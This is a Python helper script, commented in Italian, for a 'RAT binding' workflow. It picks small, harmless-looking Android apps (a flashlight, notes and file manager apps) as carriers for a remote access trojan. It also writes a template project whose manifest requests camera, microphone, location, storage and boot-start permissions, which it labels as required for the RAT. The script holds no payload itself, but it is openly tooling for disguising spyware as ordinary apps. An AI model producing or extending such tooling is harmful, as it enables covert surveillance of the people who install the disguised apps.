#!/usr/bin/env python3
"""
📱 Download Compatible APKs
Scarica APK compatibili per il binding RAT
"""

import requests
import os
from pathlib import Path

def download_file(url, filename):
    """Scarica un file da URL"""
    try:
        print(f"📥 Downloading {filename}...")
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        file_size = os.path.getsize(filename) / (1024 * 1024)  # MB
        print(f"✅ Downloaded {filename} ({file_size:.1f} MB)")
        return True
    except Exception as e:
        print(f"❌ Failed to download {filename}: {e}")
        return False

def create_apk_list():
    """Lista di APK compatibili con link diretti"""
    
    # Nota: Questi sono link di esempio. In pratica dovresti:
    # 1. Scaricare da F-Droid
    # 2. Usare APKMirror
    # 3. Creare APK personalizzato
    
    apks = [
        {
            "name": "Simple Flashlight",
            "description": "Open source flashlight app",
            "size": "~1MB",
            "compatibility": "Excellent",
            "source": "F-Droid",
            "url": "https://f-droid.org/repo/com.simplemobiletools.flashlight_*.apk",
            "manual_download": True
        },
        {
            "name": "Simple File Manager",
            "description": "Basic file manager",
            "size": "~2MB", 
            "compatibility": "Very Good",
            "source": "F-Droid",
            "url": "https://f-droid.org/repo/com.simplemobiletools.filemanager.pro_*.apk",
            "manual_download": True
        },
        {
            "name": "Simple Notes",
            "description": "Basic note taking app",
            "size": "~1MB",
            "compatibility": "Excellent", 
            "source": "F-Droid",
            "url": "https://f-droid.org/repo/com.simplemobiletools.notes.pro_*.apk",
            "manual_download": True
        }
    ]
    
    return apks

def show_manual_download_instructions():
    """Mostra istruzioni per download manuale"""
    print("\n📋 MANUAL DOWNLOAD INSTRUCTIONS")
    print("=" * 60)
    
    print("\n🔗 F-Droid (Recommended):")
    print("1. Go to: https://f-droid.org/")
    print("2. Search for: 'Simple Flashlight'")
    print("3. Download APK directly")
    print("4. File size should be < 2MB")
    
    print("\n🔗 APKMirror (Alternative):")
    print("1. Go to: https://www.apkmirror.com/")
    print("2. Search for: 'Simple Flashlight'")
    print("3. Choose older version (2019-2020)")
    print("4. Download APK")
    
    print("\n🔗 APKPure (Alternative):")
    print("1. Go to: https://apkpure.com/")
    print("2. Search for simple apps")
    print("3. Download older versions")
    
    print("\n⚠️ IMPORTANT:")
    print("- Choose apps < 5MB")
    print("- Avoid apps with many features")
    print("- Prefer open source apps")
    print("- Test with smallest APK first")

def create_test_apk_template():
    """Crea template per APK di test personalizzato"""
    
    template_dir = "test_apk_template"
    os.makedirs(template_dir, exist_ok=True)
    
    # AndroidManifest.xml
    manifest_content = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.test.ratbinding"
    android:versionCode="1"
    android:versionName="1.0">

    <!-- Required permissions for RAT -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="Test App"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>'''

    # MainActivity.java
    main_activity_content = '''package com.test.ratbinding;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView textView = new TextView(this);
        textView.setText("Test App for RAT Binding");
        textView.setTextSize(20);
        textView.setPadding(50, 50, 50, 50);
        
        setContentView(textView);
    }
}'''

    # build.gradle
    gradle_content = '''android {
    compileSdkVersion 28
    
    defaultConfig {
        applicationId "com.test.ratbinding"
        minSdkVersion 16
        targetSdkVersion 28
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        release {
            minifyEnabled false
        }
    }
}'''

    # Salva file template
    with open(os.path.join(template_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest_content)
    
    with open(os.path.join(template_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity_content)
    
    with open(os.path.join(template_dir, "build.gradle"), 'w') as f:
        f.write(gradle_content)
    
    # README
    readme_content = '''# Test APK Template for RAT Binding

## How to use:

1. Open Android Studio
2. Create new project
3. Replace AndroidManifest.xml with the provided template
4. Replace MainActivity.java with the provided template
5. Build APK in debug mode
6. Use the generated APK for RAT binding

## Features:
- All required permissions for RAT
- Minimal code (no obfuscation)
- Small size (~1MB)
- Compatible with apktool
- Target SDK 28 (stable)

## Build command:
./gradlew assembleDebug

The APK will be in: app/build/outputs/apk/debug/app-debug.apk
'''
    
    with open(os.path.join(template_dir, "README.md"), 'w') as f:
        f.write(readme_content)
    
    print(f"✅ Test APK template created in: {template_dir}/")
    print("📝 Use Android Studio to build this APK")

def main():
    print("📱 COMPATIBLE APK DOWNLOADER")
    print("=" * 60)
    
    # Mostra lista APK compatibili
    apks = create_apk_list()
    
    print("\n🎯 RECOMMENDED COMPATIBLE APKs:")
    print("=" * 60)
    
    for i, apk in enumerate(apks, 1):
        print(f"{i}. {apk['name']}")
        print(f"   Description: {apk['description']}")
        print(f"   Size: {apk['size']}")
        print(f"   Compatibility: {apk['compatibility']}")
        print(f"   Source: {apk['source']}")
        print()
    
    # Istruzioni download manuale
    show_manual_download_instructions()
    
    # Crea template APK personalizzato
    print("\n🛠️ CREATING CUSTOM APK TEMPLATE")
    print("=" * 60)
    create_test_apk_template()
    
    print("\n✅ NEXT STEPS:")
    print("1. Download one of the recommended APKs manually")
    print("2. OR use the custom APK template with Android Studio")
    print("3. Verify APK size is < 5MB")
    print("4. Try binding with the RAT system")
    
    print("\n💡 TIP:")
    print("Start with the smallest APK first!")
    print("Simple Flashlight from F-Droid is usually the best choice.")

if __name__ == "__main__":
    main()